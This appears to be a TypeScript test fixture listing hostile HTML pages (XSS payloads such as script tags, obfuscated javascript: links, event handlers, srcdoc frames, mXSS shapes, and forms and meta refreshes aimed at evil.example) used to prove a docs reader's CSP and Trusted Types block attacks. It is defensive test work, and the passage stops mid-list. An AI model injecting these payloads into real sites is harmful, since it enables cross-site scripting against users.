// The hostile pages of the XSS spec (e2e/csp/xss.spec.ts): what the one HTML sink of the app (SanitisedDocHtml) is given when the
// server's sanitiser FAILS and passes an attack through. In that case the CSP and Trusted Types are all that is left, and this is the
// list that proves they hold. Each `html` is a page exactly as the browser would be handed it as `RenderedDoc.html`.
//
// Where the inputs come from (the Rust contract is read-only here; this is a port of its inputs, and xss.spec.ts checks every name of
// the Rust lists is here, so the two cannot drift apart unseen):
//  - `ports/XSS_CORPUS`: crates/ports/src/conformance/docs.rs, the Markdown the renderer must neutralise. An entry that is raw HTML is
//    used as it stands. An entry that is Markdown syntax (a link, an image, a heading) is given as the HTML an UNSANITISED renderer
//    would write for it, which is what a failed sanitiser would pass on; the conversion is stated on each.
//  - `ports/checker`: crates/ports/tests/web_contract_docs.rs `the_checker_refuses_every_way_out_of_the_allowlist`, the pages the
//    contract's own checker (`html_violations`) must refuse, one per way out of the allowlist.
//  - `web`: attacks the web layer meets that the contract's lists do not name (an element the reader's own `withoutImages` does not
//    strip, srcdoc and javascript: frames, SVG and MathML links, mXSS shapes, bidi and zero-width characters).
//
// Two things per case besides the page:
//  - `present`: a selector for the hostile element, which MUST exist in the DOM after the page is inserted. It proves the input reached
//    the browser's parser, so what stopped it was the policy and not the app dropping it. Left out where the reader removes the element
//    itself (`forTheReader` replaces every `img` by its alt text and removes every `meta`, `base` and `link`).
//  - `blocks`: the violations the policy MUST report for this page (the directive names the browser gives). A case with `blocks` is one
//    where the policy, and nothing else, is what stops the attack: relax that directive and the spec fails for this case.
// `may` lists violations that are allowed besides; a violation outside `blocks`, `may` and the category's own list is unexpected.

export const CATEGORIES = ["script", "handler", "url", "frame", "form", "style", "base-meta", "image", "mxss", "markup", "control", "benign"] as const;
export type Category = (typeof CATEGORIES)[number];

export const CATEGORY_TITLE: Record<Category, string> = {
  script: "script elements",
  handler: "inline event handlers",
  url: "javascript:, data: and off-site URLs in links",
  frame: "frames, objects, embeds, SVG and MathML",
  form: "forms",
  style: "style attributes, style elements and stylesheets",
  "base-meta": "base, meta refresh and link",
  image: "images that name another origin",
  mxss: "template, noscript and mXSS shapes",
  markup: "comments, CDATA, ids, nesting and malformed tags",
  control: "control, bidi and zero-width characters",
  benign: "a page inside the allowlist (the control)",
};

/** Violations a category allows besides the ones a case names. Directive names as `SecurityPolicyViolationEvent.effectiveDirective`. */
export const CATEGORY_MAY: Record<Category, readonly string[]> = {
  script: [],
  handler: ["script-src-attr"],
  url: ["script-src", "script-src-elem", "require-trusted-types-for"],
  // A srcdoc frame inherits the policy of its parent, so its own scripts and handlers are reported from the child document.
  frame: ["frame-src", "child-src", "object-src", "script-src", "script-src-elem", "script-src-attr", "style-src-elem", "require-trusted-types-for", "img-src", "connect-src", "default-src"],
  form: ["form-action", "script-src-attr", "script-src", "require-trusted-types-for"],
  style: ["style-src-elem", "style-src-attr", "style-src"],
  "base-meta": ["base-uri", "style-src-elem", "style-src", "img-src", "connect-src", "default-src"],
  image: ["img-src", "script-src-attr"],
  mxss: ["script-src-attr", "style-src-elem", "style-src-attr", "style-src", "img-src"],
  markup: [],
  control: [],
  benign: [],
};

export type XssCase = {
  readonly name: string;
  readonly category: Category;
  readonly from: "ports/XSS_CORPUS" | "ports/checker" | "web";
  readonly html: string;
  readonly present?: string;
  readonly blocks?: readonly string[];
  readonly may?: readonly string[];
  /** In the small set that also runs through the second entry point (`/docs/:slug`) and in dark. */
  readonly core?: true;
  /**
   * A way out that the CSP and Trusted Types do NOT close, found by this corpus: the case passes while it is open, says so on the
   * report, and FAILS the day it is closed (so the record cannot go stale). The key of an entry of `GAPS`.
   */
  readonly gap?: string;
};

/**
 * The known gaps: ways out of the allowlist that neither the CSP nor Trusted Types closes. EMPTY since the reader removes `meta`, `base`
 * and `link` (src/features/docs/reader-html.ts `withoutHeadTags`): the one gap this corpus found, a `<meta http-equiv=refresh>` that the
 * browser honours once it is inserted, was closed there, and the four pages that recorded it now have to pass as fully closed. An entry
 * is `name: "what is open"`, a case that carries `gap: "name"` must then leave the document by itself, and it fails the day it does not.
 */
export const GAPS: Readonly<Record<string, string>> = {};

type Extra = Pick<XssCase, "present" | "blocks" | "may" | "core" | "gap">;
const corpus = (name: string, category: Category, html: string, extra: Extra = {}): XssCase => ({ name, category, from: "ports/XSS_CORPUS", html, ...extra });
const checker = (label: string, category: Category, html: string, extra: Extra = {}): XssCase => ({ name: `checker: ${label}`, category, from: "ports/checker", html, ...extra });
const web = (name: string, category: Category, html: string, extra: Extra = {}): XssCase => ({ name, category, from: "web", html, ...extra });

/** An anchor with the attributes the allowlist wants, so that the URL is the only thing wrong with it. */
const a = (href: string, text = "x"): string => `<a href="${href}" rel="noopener noreferrer">${text}</a>`;

// ---------------------------------------------------------------------------------------------------------------------------------
// ports/XSS_CORPUS (57 entries). The names are the Rust names.

const FROM_CORPUS: readonly XssCase[] = [
  corpus("script-block", "script", "# Title\n\n<script>alert(1)</script>\n\nafter\n", { present: "script", core: true }),
  corpus("script-inline", "script", "text <script>alert(1)</script> text\n", { present: "script" }),
  // `withoutImages` of the reader replaces an img by its alt text, so this input never reaches the sink as an img (no `present`).
  corpus("img-onerror", "handler", "<img src=x onerror=alert(1)>\n"),
  // Markdown links, given as the anchor an unsanitised renderer writes.
  corpus("javascript-link", "url", a("javascript:alert(1)"), { present: 'a[href^="javascript:"]', blocks: ["script-src-elem"], core: true }),
  corpus("javascript-link-mixed-case", "url", a("JaVaScRiPt:alert(1)"), { present: "a", blocks: ["script-src-elem"] }),
  corpus("javascript-link-entity", "url", a("&#106;avascript:alert(1)"), { present: "a", blocks: ["script-src-elem"] }),
  corpus("javascript-link-tab", "url", a("jav&#x09;ascript:alert(1)"), { present: "a", blocks: ["script-src-elem"] }),
  corpus("data-link", "url", a("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="), { present: 'a[href^="data:"]' }),
  corpus("vbscript-link", "url", a("vbscript:msgbox(1)"), { present: "a" }),
  corpus("http-link", "url", a("http://insecure.example/"), { present: "a" }),
  corpus("protocol-relative-link", "url", a("//evil.example/"), { present: "a" }),
  corpus("backslash-link", "url", a("/\\evil.example/"), { present: "a" }),
  corpus("userinfo-link", "url", a("https://docs.example@evil.example/"), { present: "a" }),
  // `<javascript:alert(1)>` is an autolink in Markdown; in HTML it is an element with a strange name.
  corpus("autolink-javascript", "url", "<javascript:alert(1)>\n"),
  corpus("style-attribute", "style", '<p style="background:url(javascript:alert(1))">styled</p>\n', { present: "p[style]", blocks: ["style-src-attr"], core: true }),
  corpus("event-handlers", "handler", '<p onclick="alert(1)" onmouseover="alert(2)">hover</p>\n', { present: "p[onclick]", blocks: ["script-src-attr"], core: true }),
  corpus("iframe", "frame", '<iframe src="https://evil.example/"></iframe>\n', { present: "iframe", blocks: ["frame-src"], core: true }),
  corpus("object-embed", "frame", '<object data="x.swf"></object><embed src="x.swf">\n', { present: "object", blocks: ["object-src"] }),
  corpus("svg", "frame", "<svg onload=alert(1)><circle r=1></circle></svg>\n", { present: "svg", blocks: ["script-src-attr"], core: true }),
  corpus("math", "frame", '<math><mi xlink:href="javascript:alert(1)">x</mi></math>\n', { present: "math" }),
  corpus("form", "form", '<form action="https://evil.example/"><input name=password><button>go</button></form>\n', { present: "form", blocks: ["form-action"], core: true }),
  // base, meta and link: the reader removes all three before the sink (`withoutHeadTags`), so nothing of them reaches the DOM and no
  // `present` or `blocks` is possible for these pages. The policy behind the reader is proven for `base` and `link` by the controls of
  // the spec, which add one to the page without the reader. What these pages prove is that the page stays where it is and asks for nothing.
  corpus("base-meta-link", "base-meta", '<base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example/"><link rel="stylesheet" href="https://evil.example/x.css">\n', { core: true }),
  corpus("style-element", "style", "<style>@import url(https://evil.example/x.css);</style>\n", { present: "style", blocks: ["style-src-elem"], core: true }),
  // Markdown images, given as the img an unsanitised renderer writes. The reader strips every `img` (no `present`).
  corpus("data-image", "image", '<img src="data:image/png;base64,iVBORw0KGgo=" alt="x">\n'),
  corpus("data-image-html", "image", '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">\n'),
  corpus("external-image", "image", '<img src="https://evil.example/pixel.png" alt="x">\n'),
  corpus("protocol-relative-image", "image", '<img src="//evil.example/pixel.png" alt="x">\n'),
  corpus("raw-a-protocol-relative", "url", '<a href="//evil.example/" rel="noopener noreferrer">x</a>\n', { present: "a" }),
  corpus("raw-a-backslash", "url", '<a href="/\\evil.example/" rel="noopener noreferrer">x</a>\n', { present: "a" }),
  corpus("raw-a-tab-path", "url", '<a href="/\t/evil.example/" rel="noopener noreferrer">x</a>\n', { present: "a" }),
  corpus("raw-a-line-feed-path", "url", '<a href="/\n/evil.example/" rel="noopener noreferrer">x</a>\n', { present: "a" }),
  corpus("raw-img-protocol-relative", "image", '<img src="//evil.example/p.png" alt="x">\n'),
  corpus("raw-img-backslash", "image", '<img src="/\\evil.example/p.png" alt="x">\n'),
  corpus("raw-img-tab-path", "image", '<img src="/\t/evil.example/p.png" alt="x">\n'),
  corpus("raw-img-line-feed-path", "image", '<img src="/\n/evil.example/p.png" alt="x">\n'),
  corpus("md-link-tab-path", "url", a("/\t/evil.example/"), { present: "a" }),
  corpus("md-image-tab-path", "image", '<img src="/\t/evil.example/p.png" alt="x">\n'),
  // Relative links of Markdown: written as they stand by an unsanitised renderer (the server rewrites them to the reader route).
  corpus("relative-md-link", "url", a("guide.md", "guide"), { present: "a" }),
  corpus("relative-md-link-parent", "url", a("../x.md", "up"), { present: "a" }),
  corpus("relative-md-link-fragment", "url", a("guide.md#usage", "usage"), { present: "a" }),
  corpus("srcset-image", "image", '<img src="/a.png" srcset="https://evil.example/b.png 2x">\n'),
  corpus("html-comment", "markup", "<!-- a comment --><!--[if IE]><script>alert(1)</script><![endif]-->\n"),
  corpus("cdata-doctype-pi", "markup", "<![CDATA[x]]><!DOCTYPE html><?php echo 1 ?>\n"),
  corpus("id-clobbering", "markup", '<h1 id="admin">x</h1><a id="root" name="root">y</a><p id="__proto__">z</p>\n\n# admin\n\n# root\n', { present: "#admin" }),
  corpus("target-blank", "url", '<a href="https://docs.example/" target="_blank">x</a>\n', { present: "a[target]" }),
  corpus("details-ontoggle", "handler", "<details open ontoggle=alert(1)><summary>x</summary></details>\n", { present: "details", blocks: ["script-src-attr"] }),
  corpus("nested-malformed", "script", "<scr<script>ipt>alert(1)</scr</script>ipt>\n"),
  corpus("template-noscript", "mxss", '<template><script>alert(1)</script></template><noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>\n', { present: "template", core: true }),
  // `# <img ...> Title <script>x</script>` as the heading an unsanitised renderer writes.
  corpus("heading-with-markup", "handler", '<h1 id="doc-title"><img src=x onerror=alert(1)> Title <script>x</script></h1>\n', { present: "[id=doc-title]" }),
  corpus("table-with-markup", "script", '<table><thead><tr><th>a</th><th>b</th></tr></thead><tbody><tr><td><script>1</script></td><td><a href="javascript:1" rel="noopener noreferrer">x</a></td></tr></tbody></table>\n', {
    present: "table",
    blocks: ["script-src-elem"],
  }),
  // The one correctly escaped page of the list: code is text. It must show the markup as text and nothing else.
  corpus("code-with-markup", "markup", "<pre><code class=\"language-html\">&lt;script&gt;alert(1)&lt;/script&gt;\n</code></pre>\n<p><code>&lt;img src=x onerror=1&gt;</code></p>\n", { present: "pre code" }),
  corpus("entities-in-text", "markup", "&lt;script&gt;alert(1)&lt;/script&gt; &amp; &#60;img src=x onerror=alert(1)&#62;\n"),
  corpus("control-characters", "control", "a\u0007b\u001b[31mc\u0085d\u0008e\n"),
  // Nesting: the Markdown of the Rust entries as the nested blocks an unsanitised renderer writes.
  corpus("deep-nesting", "markup", `${"<blockquote>".repeat(90)}<p>deep</p>${"</blockquote>".repeat(90)}\n`, { present: "blockquote" }),
  corpus("deep-nesting-quotes", "markup", `${"<blockquote>".repeat(120)}<p>deep</p>${"</blockquote>".repeat(120)}\n`, { present: "blockquote" }),
  corpus("deep-nesting-lists", "markup", `${"<ul><li>item ".repeat(40)}${"</li></ul>".repeat(40)}\n`, { present: "ul" }),
  corpus("marker-text", "benign", "<p>The value is [REDACTED: 12 chars, api_key] here</p>\n", { present: "p" }),
];

// ---------------------------------------------------------------------------------------------------------------------------------
// ports/checker (the pages `html_violations` must refuse). The labels are the Rust labels, behind "checker: ".

const FROM_CHECKER: readonly XssCase[] = [
  checker("script element", "script", "<script>alert(1)</script>", { present: "script" }),
  checker("script in upper case", "script", "<SCRIPT>alert(1)</SCRIPT>", { present: "script" }),
  checker("style element", "style", "<style>p{}</style>", { present: "style", blocks: ["style-src-elem"] }),
  checker("iframe", "frame", '<iframe src="/x"></iframe>', { present: "iframe", blocks: ["frame-src"] }),
  checker("svg", "frame", '<svg onload="x"></svg>', { present: "svg", blocks: ["script-src-attr"] }),
  checker("form and input", "form", '<form><input name="p"></form>', { present: "form" }),
  checker("object", "frame", '<object data="/x"></object>', { present: "object", blocks: ["object-src"] }),
  checker("details", "markup", "<details><summary>x</summary></details>", { present: "details" }),
  checker("base", "base-meta", '<base href="https://evil.example/">'),
  checker("meta refresh", "base-meta", '<meta http-equiv="refresh" content="0">'),
  checker("comment", "markup", "<p>x</p><!-- x -->"),
  checker("conditional comment", "markup", "<!--[if IE]><p>x</p><![endif]-->"),
  checker("doctype", "markup", "<!DOCTYPE html>"),
  checker("cdata", "markup", "<![CDATA[x]]>"),
  checker("processing instruction", "markup", "<?php echo 1 ?>"),
  checker("event handler", "handler", '<p onclick="alert(1)">x</p>', { present: "p[onclick]", blocks: ["script-src-attr"] }),
  checker("event handler on an image", "handler", '<img src="/a.png" onerror="alert(1)">'),
  checker("style attribute", "style", '<p style="color:red">x</p>', { present: "p[style]", blocks: ["style-src-attr"] }),
  checker("class attribute", "markup", '<p class="x">x</p>', { present: "p.x" }),
  checker("target attribute", "url", '<a href="https://d.example/" rel="noopener noreferrer" target="_blank">x</a>', { present: "a[target]" }),
  checker("srcset", "image", '<img src="/a.png" srcset="/b.png 2x">'),
  checker("data attribute", "markup", '<p data-x="1">x</p>', { present: "p[data-x]" }),
  checker("id on a paragraph", "markup", '<p id="doc-x">x</p>', { present: "#doc-x" }),
  checker("id with no prefix", "markup", '<h1 id="admin">x</h1>', { present: "#admin" }),
  checker("id with upper case", "markup", '<h1 id="doc-Admin">x</h1>', { present: "[id]" }),
  checker("id with an underscore", "markup", '<h1 id="doc-__proto__">x</h1>', { present: "[id]" }),
  checker("id with an empty slug", "markup", '<h1 id="doc-">x</h1>', { present: "[id]" }),
  checker("id twice in a page", "markup", '<h1 id="doc-x">a</h1><h2 id="doc-x">b</h2>', { present: "[id=doc-x]" }),
  checker("the same attribute twice", "markup", '<h1 id="doc-x" id="doc-y">x</h1>', { present: "[id]" }),
  checker("javascript link", "url", a("javascript:alert(1)"), { present: "a", blocks: ["script-src-elem"] }),
  checker("javascript link in mixed case", "url", a("JaVaScRiPt:alert(1)"), { present: "a", blocks: ["script-src-elem"] }),
  checker("javascript link with an entity", "url", a("&#106;avascript:alert(1)"), { present: "a", blocks: ["script-src-elem"] }),
  checker("javascript link with a named entity", "url", a("javascript&colon;alert(1)"), { present: "a", blocks: ["script-src-elem"] }),
  checker("data link", "url", a("data:text/html;base64,PHNjcmlwdD4="), { present: "a" }),
  checker("http link", "url", a("http://insecure.example/"), { present: "a" }),
  checker("mailto link", "url", a("mailto:a@example.com"), { present: "a" }),
  checker("protocol-relative link", "url", a("//evil.example/"), { present: "a" }),
  checker("link with a backslash", "url", a("/\\evil.example/"), { present: "a" }),
  checker("link with credentials", "url", a("https://docs.example@evil.example/"), { present: "a" }),
  checker("link with an empty host", "url", a("https:///x"), { present: "a" }),
  checker("relative link", "url", a("guide.md"), { present: "a" }),
  checker("link with a space", "url", a("https://d.example/a b"), { present: "a" }),
  checker("path with a tab in it", "url", a("/\t/evil.example/"), { present: "a" }),
  checker("path with a line feed in it", "url", a("/\n/evil.example/"), { present: "a" }),
  checker("path with a carriage return in it", "url", a("/\r/evil.example/"), { present: "a" }),
  checker("https link ending in a tab", "url", a("https://d.example/\t"), { present: "a" }),
  checker("https link ending in a line feed", "url", a("https://d.example/\n"), { present: "a" }),
  checker("https link with a tab in the host", "url", a("https://d.exa\tmple/"), { present: "a" }),
  checker("path with a non-ascii letter", "url", a("/caf\u00e9"), { present: "a" }),
  checker("https host with a full-width full stop", "url", a("https://d\uff0eexample/"), { present: "a" }),
  checker("https link with a non-breaking space", "url", a("https://d.example/a\u00a0b"), { present: "a" }),
  checker("link of more than the bound", "url", a(`https://d.example/${"a".repeat(2048)}`), { present: "a" }),
  checker("link with a quote in the value", "handler", '<a href="https://d.example/"onclick="x" rel="noopener noreferrer">x</a>', { present: "a[onclick]", blocks: ["script-src-attr"] }),
  checker("link without rel", "url", '<a href="https://d.example/">x</a>', { present: "a" }),
  checker("link with another rel", "url", '<a href="https://d.example/" rel="nofollow">x</a>', { present: "a" }),
  checker("link without href", "url", '<a rel="noopener noreferrer">x</a>', { present: "a" }),
  checker("link inside a link", "url", `<a href="/a" rel="noopener noreferrer">${a("/b")}</a>`, { present: "a" }),
  checker("fragment that is no heading id", "url", a("#main"), { present: "a" }),
  checker("external image", "image", '<img src="https://evil.example/p.png" alt="">'),
  checker("data image", "image", '<img src="data:image/png;base64,AAAA" alt="">'),
  checker("protocol-relative image", "image", '<img src="//evil.example/p.png" alt="">'),
  checker("image path with a tab in it", "image", '<img src="/\t/evil.example/p.png" alt="">'),
  checker("image path with a line feed in it", "image", '<img src="/\n/evil.example/p.png" alt="">'),
  checker("image path with a backslash", "image", '<img src="/\\evil.example/p.png" alt="">'),
  checker("image path with a non-ascii letter", "image", '<img src="/caf\u00e9.png" alt="">'),
  checker("image without src", "image", '<img alt="x">'),
  checker("single-quoted value", "image", "<img src='/a.png'>"),
  checker("unquoted value", "image", "<img src=/a.png>"),
  checker("attribute with no value", "image", '<img src="/a.png" alt>'),
  checker("an entity outside the five", "image", '<img src="/a.png" alt="&copy;">'),
  checker("a hex entity the text does not list", "image", '<img src="/a.png" alt="&#x27;">'),
  checker("a raw angle bracket in a value", "image", '<img src="/a.png" alt="<b>">'),
  checker("unterminated tag", "markup", "<p"),
  checker("unterminated value", "image", '<img src="/a.png'),
  checker("less-than in text", "markup", "<p>a < b</p>"),
  checker("less-than at the end", "markup", "<p>x</p><"),
  checker("closing tag with a space", "markup", "<p>x</p >"),
  checker("closing tag of a void element", "markup", "<br></br>"),
  checker("self-closing non-void element", "markup", "<p/>"),
  checker("unclosed element", "markup", "<p>x"),
  checker("closing tag that does not match", "markup", "<p><em>x</p></em>"),
  checker("closing tag with nothing open", "markup", "</p>"),
  checker("control character", "control", "<p>a\u0000b</p>"),
  checker("escape character", "control", "<p>a\u001b[31mb</p>"),
  checker("c1 control character", "control", "<p>a\u0085b</p>"),
];

// ---------------------------------------------------------------------------------------------------------------------------------
// web: what the contract's lists do not name.

const FROM_WEB: readonly XssCase[] = [
  // The reader replaces every `<img` by its alt text. `<image>` is an `img` to the HTML parser and is not matched by that pattern, so it
  // reaches the policy as a real image with a handler or a foreign source: the layer that is tested here is the CSP.
  web("image element: onerror handler", "image", "<image src=x onerror=\"alert(1)\">", { present: "img", blocks: ["script-src-attr"], core: true }),
  web("image element: off-site source", "image", '<image src="https://evil.example/pixel.png">', { present: "img", blocks: ["img-src"], core: true }),
  web("image element: protocol-relative source", "image", '<image src="//evil.example/pixel.png">', { present: "img", blocks: ["img-src"] }),
  web("image element: srcset to another origin", "image", '<image src="/a.png" srcset="https://evil.example/b.png 1x">', { present: "img", blocks: ["img-src"] }),
  web("image element: data URL of an SVG with a script", "image", '<image src="data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 onload=%22alert(1)%22/>">', { present: "img" }),
  web("picture source: off-site srcset", "image", '<picture><source srcset="https://evil.example/b.png"><image src="/a.png"></picture>', { present: "picture", blocks: ["img-src"] }),
  web("video poster and source", "image", '<video poster="https://evil.example/poster.png"><source src="https://evil.example/v.mp4" onerror="alert(1)"></video>', { present: "video", may: ["media-src"] }),
  web("audio with an error handler", "handler", '<audio src=x onerror="alert(1)"></audio>', { present: "audio", blocks: ["script-src-attr"], may: ["media-src"] }),
  web("input autofocus onfocus", "handler", '<input autofocus onfocus="alert(1)">', { present: "input", blocks: ["script-src-attr"] }),
  web("select autofocus onfocus", "handler", '<select autofocus onfocus="alert(1)"><option>a</option></select>', { present: "select", blocks: ["script-src-attr"] }),
  web("marquee onstart", "handler", '<marquee onstart="alert(1)">x</marquee>', { present: "marquee" }),
  web("body onload", "handler", '<body onload="alert(1)">x', {}),
  web("button onclick", "handler", '<button onclick="alert(1)">go</button>', { present: "button[onclick]", blocks: ["script-src-attr"] }),
  web("div with every mouse and key handler", "handler", '<div tabindex="0" onmouseover="alert(1)" onmousedown="alert(2)" onkeydown="alert(3)" onfocus="alert(4)" oncontextmenu="alert(5)">x</div>', {
    present: "div[onkeydown]",
    blocks: ["script-src-attr"],
  }),
  web("handler with a sentinel instead of a dialog", "handler", '<svg onload="window.__xss=1"></svg><p onclick="window.__xss=2">x</p>', { present: "svg", blocks: ["script-src-attr"] }),
  web("svg animate onbegin", "frame", '<svg><animate onbegin="alert(1)" attributeName="x" dur="1s"></animate></svg>', { present: "animate", blocks: ["script-src-attr"] }),
  web("svg set onbegin", "frame", '<svg><set onbegin="alert(1)" attributeName="x" to="0"></set></svg>', { present: "set", blocks: ["script-src-attr"] }),
  web("svg anchor with javascript:", "frame", '<svg width="100" height="100"><a href="javascript:alert(1)"><rect width="100" height="100"></rect></a></svg>', { present: "svg a", blocks: ["script-src-elem"], core: true }),
  web("svg anchor with xlink:href javascript:", "frame", '<svg width="100" height="100"><a xlink:href="javascript:alert(1)"><rect width="100" height="100"></rect></a></svg>', { present: "svg a", blocks: ["script-src-elem"] }),
  web("svg use of another origin", "frame", '<svg><use href="https://evil.example/x.svg#a"></use></svg>', { present: "use", may: ["connect-src", "img-src"] }),
  web("svg use of a data URL", "frame", '<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0iYSIvPg==#a"></use></svg>', { present: "use", may: ["connect-src", "img-src"] }),
  web("svg foreignObject with a script and a handler", "frame", '<svg><foreignObject><p onclick="alert(1)">x</p><script>alert(2)</script></foreignObject></svg>', { present: "foreignObject" }),
  web("svg style element", "frame", "<svg><style>@import url(https://evil.example/x.css);</style></svg>", { present: "svg style", blocks: ["style-src-elem"] }),
  web("math href javascript:", "frame", '<math href="javascript:alert(1)">click</math>', { present: "math" }),
  web("math maction with xlink:href javascript:", "frame", '<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)">click</maction></math>', { present: "maction" }),
  web("iframe srcdoc with a script", "frame", '<iframe srcdoc="<script>parent.__xss=1;alert(1)</script>"></iframe>', { present: "iframe", blocks: ["script-src-elem"], core: true }),
  web("iframe srcdoc with an image handler", "frame", '<iframe srcdoc="<image src=x onerror=&quot;top.__xss=1;alert(1)&quot;>"></iframe>', { present: "iframe", blocks: ["script-src-attr"] }),
  web("iframe srcdoc that tries to load another origin", "frame", '<iframe srcdoc="<style>@import url(https://evil.example/x.css)</style><image src=https://evil.example/p.png>"></iframe>', { present: "iframe", blocks: ["style-src-elem", "img-src"] }),
  web("iframe with a javascript: source", "frame", '<iframe src="javascript:alert(1)"></iframe>', { present: "iframe", blocks: ["script-src-elem"] }),
  web("iframe with a data: source", "frame", '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>', { present: "iframe", blocks: ["frame-src"] }),
  web("iframe with a blob: source", "frame", '<iframe src="blob:https://evil.example/00000000-0000-0000-0000-000000000000"></iframe>', { present: "iframe" }),
  web("frameset and frame", "frame", '<frameset><frame src="https://evil.example/"></frameset>', {}),
  web("object with a javascript: data", "frame", '<object data="javascript:alert(1)"></object>', { present: "object" }),
  web("embed with a javascript: source", "frame", '<embed src="javascript:alert(1)">', { present: "embed" }),
  web("applet", "frame", '<applet code="x.class" archive="https://evil.example/x.jar"></applet>', {}),
  web("script with a source of another origin", "script", '<script src="https://evil.example/x.js"></script>', { present: "script" }),
  web("script with a source of this origin", "script", '<script src="/assets/other.js" type="module"></script>', { present: "script" }),
  web("script with a type that is not JavaScript", "script", '<script type="text/template">alert(1)</script><script type="importmap">{"imports":{"x":"https://evil.example/x.js"}}</script>', { present: "script" }),
  web("script in an svg", "script", '<svg><script>alert(1)</script></svg>', { present: "svg script" }),
  web("script split by a comment and a CDATA section", "script", "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>", { present: "svg" }),
  web("javascript: with a leading space", "url", a(" javascript:alert(1)"), { present: "a", blocks: ["script-src-elem"] }),
  web("javascript: with a leading control character", "url", a("\u0001javascript:alert(1)"), { present: "a", blocks: ["script-src-elem"] }),
  web("javascript: with a line feed inside", "url", a("java\nscript:alert(1)"), { present: "a", blocks: ["script-src-elem"] }),
  web("javascript: in hex entities", "url", a("&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)"), { present: "a", blocks: ["script-src-elem"] }),
  web("data: URL of HTML with a script", "url", a("data:text/html,<script>alert(1)</script>"), { present: "a" }),
  web("blob: link of another origin", "url", a("blob:https://evil.example/0"), { present: "a" }),
  web("file: link", "url", a("file:///etc/passwd"), { present: "a" }),
  web("view-source: link", "url", a("view-source:https://evil.example/"), { present: "a" }),
  // (ftp: is left out: Chromium opens an external-protocol prompt for it, which stalls the page. That is the browser, not the policy.)
  web("link that names this origin with encoded slashes", "url", a("/%2F%2Fevil.example/"), { present: "a", core: true }),
  web("link that names this origin with an encoded backslash", "url", a("/%5Cevil.example/"), { present: "a" }),
  web("link with a javascript: target and a button", "url", `${a("javascript:alert(1)")}<button>${a("javascript:alert(2)")}</button>`, { present: "button a" }),
  web("area with a javascript: href", "url", '<map name="m"><area shape="rect" coords="0,0,100,100" href="javascript:alert(1)"></map><image usemap="#m" src="/a.png" width="100" height="100">', { present: "area", blocks: ["script-src-elem"] }),
  web("form with a javascript: action", "form", '<form action="javascript:alert(1)"><button>go</button></form>', { present: "form", blocks: ["form-action"] }),
  web("form with a button formaction", "form", '<form><button formaction="https://evil.example/">go</button></form>', { present: "button[formaction]", blocks: ["form-action"] }),
  web("form with an input formaction javascript:", "form", '<form><input type="submit" formaction="javascript:alert(1)" value="go"></form>', { present: "input[formaction]", blocks: ["form-action"] }),
  web("form that posts to this origin's sign-out", "form", '<form method="post" action="/auth/logout"><button>go</button></form>', { present: "form" }),
  web("form with a method and an enctype to another origin", "form", '<form method="post" enctype="text/plain" action="https://evil.example/"><input name="a" value="b"><button>go</button></form>', {
    present: "form",
    blocks: ["form-action"],
  }),
  web("form that submits itself", "form", '<form action="https://evil.example/" id="f"><input name="a"></form><image src=x onerror="document.getElementById(\'f\').submit()">', { present: "form", blocks: ["form-action", "script-src-attr"] }),
  web("link stylesheet of another origin", "style", '<link rel="stylesheet" href="https://evil.example/x.css">'),
  web("link stylesheet with a data URL", "style", '<link rel="stylesheet" href="data:text/css,p{background:url(https://evil.example/p.png)}">'),
  web("style element with an import and a background", "style", "<style>@import 'https://evil.example/x.css';p{background:url(https://evil.example/p.png)}</style><p>x</p>", { present: "style", blocks: ["style-src-elem"] }),
  web("style attribute with a url()", "style", '<p style="background:url(https://evil.example/p.png)">x</p>', { present: "p[style]", blocks: ["style-src-attr"] }),
  web("style attribute on an svg and a table cell", "style", '<svg style="position:fixed;top:0;left:0;width:100%;height:100%"></svg><table><tr><td style="color:red">x</td></tr></table>', { present: "svg[style]", blocks: ["style-src-attr"] }),
  web("link prefetch, preload and preconnect", "base-meta", '<link rel="prefetch" href="https://evil.example/p"><link rel="preload" href="https://evil.example/p.js" as="script"><link rel="preconnect" href="https://evil.example"><link rel="dns-prefetch" href="https://evil.example"><link rel="modulepreload" href="https://evil.example/m.js">'),
  web("link icon and manifest of another origin", "base-meta", '<link rel="icon" href="https://evil.example/i.png"><link rel="manifest" href="https://evil.example/m.json">'),
  web("base with a target and a relative link after it", "base-meta", `<base href="https://evil.example/" target="_blank">${a("x.md", "relative")}`, { present: "a" }),
  web("meta refresh to another origin", "base-meta", '<meta http-equiv="refresh" content="0;url=https://evil.example/">', { core: true }),
  web("meta refresh to a javascript: URL", "base-meta", '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'),
  web("meta refresh to this origin", "base-meta", '<meta http-equiv="refresh" content="0;url=/docs/view?path=%2Fgit%2Fmain%2Fdocs%2Faccount-sorting.md">'),
  web("meta content-security-policy that relaxes", "base-meta", '<meta http-equiv="Content-Security-Policy" content="script-src * \'unsafe-inline\'; default-src *"><image src=x onerror="alert(1)">', { present: "img", blocks: ["script-src-attr"] }),
  web("meta set-cookie and default-style", "base-meta", '<meta http-equiv="set-cookie" content="a=b"><meta http-equiv="default-style" content="x">'),
  // The reader takes a head tag out and what was around it is joined: these pages would be left with a tag the server never wrote, so the
  // reader shows nothing for them (`withoutHeadTags`, `forTheReader`). The page must stay where it is, and nothing may be asked for.
  web("meta refresh made by taking out another tag", "base-meta", '<p>kept?</p><<meta>meta http-equiv="refresh" content="0;url=https://evil.example/">'),
  web("meta refresh written by the alt text of an image", "base-meta", '<<img src=x alt="meta http-equiv=refresh content=0;url=https://evil.example/">>'),
  web("image written by taking out a meta", "base-meta", '<<meta>img src="https://evil.example/p.png" onerror="alert(1)">'),
  web("noscript with a closing tag in an attribute", "mxss", '<noscript><p title="</noscript><image src=x onerror=alert(1)>">', { present: "noscript", core: true }),
  web("xmp with a closing tag in an attribute", "mxss", '<xmp><p title="</xmp><image src=x onerror=alert(1)>"></xmp>', { present: "xmp" }),
